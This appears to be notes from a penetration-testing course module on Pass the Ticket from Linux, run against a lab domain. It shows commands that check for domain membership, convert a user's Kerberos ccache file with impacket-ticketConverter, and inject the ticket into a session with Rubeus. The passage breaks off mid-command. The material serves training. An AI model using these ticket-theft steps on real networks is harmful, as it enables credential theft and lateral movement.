# Pass the Ticket (PtT) from Linux
## Identifying Linux and Active Directory Integration

We can identify if the Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
#### realm - Check If Linux Machine is Domain Joined

```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain joined. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain joined.
#### PS - Check if Linux Machine is Domain Joined

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```
## Finding Kerberos Tickets in Linux

As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.
## Miscellaneous

If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
#### Impacket Ticket Converter

```shell-session
Yashfren@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.
#### Importing Converted Ticket into Windows Session with Rubeus

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
